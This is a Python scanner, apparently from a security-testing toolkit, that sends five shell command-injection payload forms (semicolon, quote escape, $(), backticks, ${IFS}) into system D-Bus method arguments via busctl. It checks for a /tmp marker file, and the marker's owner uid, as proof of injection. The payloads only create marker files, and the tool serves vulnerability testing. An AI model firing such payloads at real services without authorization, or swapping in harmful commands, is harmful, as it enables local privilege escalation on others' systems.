#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
inj_sweep.py —— D-Bus 参数注入批量扫描器（os-security skill 工具）

用法（以普通用户运行）：
  python3 inj_sweep.py <服务名> <对象路径> <接口> \
      <方法1> <签名1> [参数占位...] \
      [<方法2> <签名2> [参数占位...] ...]

参数占位约定：命令行中每个 "INJ" 占位符会被依次替换为五形注入载荷：
  ① ;   分号形     :  <val>; touch <marker>; #
  ② '   引号逃逸   :  <val>'; touch <marker>; #      ← 模板把参数包在单引号时用
  ③ $   替换形     :  <val>$(touch <marker>)
  ④ `   反引号形   :  <val>`touch <marker>`
  ⑤ I   IFS 空格形 :  ;touch${IFS}<marker>;#

例：
  python3 inj_sweep.py com.example /obj com.example.Iface setConfig s INJ

规则（与 SKILL.md 主流程一致）：
  - 标记约定 /tmp/inj_<tag>（tag=方法名_载荷形）；核对 owner uid 是否等于服务运行身份
  - AccessDenied = 被鉴权拦截（该面结束，不是"无注入"）
  - "无注入"结论须满足证据标准：本工具记录每次调用的返回分层 + marker 结果，
    但**载荷是否到达执行点**需另行取证（组件日志出现构造命令 / strace 见 execve）
退出码：0 = 至少一个 marker 出现；1 = 无 marker；2 = 用法/环境错误
"""

import os
import sys
import glob
import time
import subprocess

SERVICE = OBJ = IFACE = None
FORMS = [
    ("semi",  lambda m, v: f"{v}; touch {m}; #"),
    ("quote", lambda m, v: f"{v}'; touch {m}; #"),
    ("sub",   lambda m, v: f"{v}$(touch {m})"),
    ("back",  lambda m, v: f"{v}`touch {m}`"),
    ("ifs",   lambda m, v: f";touch${{{IFS_STR}}}{m};#"),
]
IFS_STR = "IFS"


def sh(cmd):
    return subprocess.run(cmd, capture_output=True, text=True, timeout=30)


def svc_uid():
    pid = sh(["pgrep", "-f", SERVICE]).stdout.split()
    if not pid:
        return None
    out = sh(["ps", "-o", "uid=", "-p", pid[0]]).stdout.strip()
    return out


def sweep(method, sig, placeholders):
    hits = []
    for fname, mk in FORMS:
        tag = f"{method}_{fname}"
        marker = f"/tmp/inj_{tag}"
        for old in glob.glob(marker + "*"):
            try:
                os.remove(old)
            except OSError:
                pass
        args = [mk(marker, p if p != "INJ" else "x") for p in placeholders]
        # 用对应类型的合法值替换非 INJ 占位（尽力而为：保持原样）
        argv = ["busctl", "--system", "call", SERVICE, OBJ, IFACE, method, sig] + args
        r = sh(argv)
        time.sleep(0.5)
        if os.path.exists(marker):
            uid = os.stat(marker).st_uid
            print(f"  [+] {tag:24} MARKER owner_uid={uid}  ← 注入成立")
            hits.append((tag, uid))
        else:
            err = (r.stderr or r.stdout).strip().splitlines()
            hint = err[-1][:90] if err else "(no reply)"
            print(f"  [-] {tag:24} {hint}")
    return hits


def main():
    global SERVICE, OBJ, IFACE
    if len(sys.argv) < 6:
        print(__doc__)
        return 2
    SERVICE, OBJ, IFACE = sys.argv[1], sys.argv[2], sys.argv[3]
    su = svc_uid()
    print(f"[*] service={SERVICE} uid={su or '?'} caller uid={os.getuid()}")
    print("[*] 提示：本工具给出返回分层 + marker；『载荷是否到达执行点』需另查组件日志/strace\n")

    args = sys.argv[4:]
    all_hits = []
    i = 0
    while i < len(args):
        method, sig = args[i], args[i + 1]
        i += 2
        ph = []
        while i < len(args) and args[i] not in () and not (i + 1 < len(args) and False):
            # 参数占位直到下一个 "方法 签名" 对（启发：占位数 = 签名中类型字符数）
            ntypes = sum(1 for c in sig if c.isalpha())
            for _ in range(ntypes):
                if i < len(args):
                    ph.append(args[i]); i += 1
            break
        print(f"== {method} ({sig}) ==")
        all_hits += sweep(method, sig, ph)

    print()
    if all_hits:
        for tag, uid in all_hits:
            print(f"  漏洞证据: /tmp/inj_{tag} owner_uid={uid}")
        return 0
    print("  无 marker——判『无注入』前先满足证据标准（载荷到达执行点）")
    return 1


if __name__ == "__main__":
    sys.exit(main())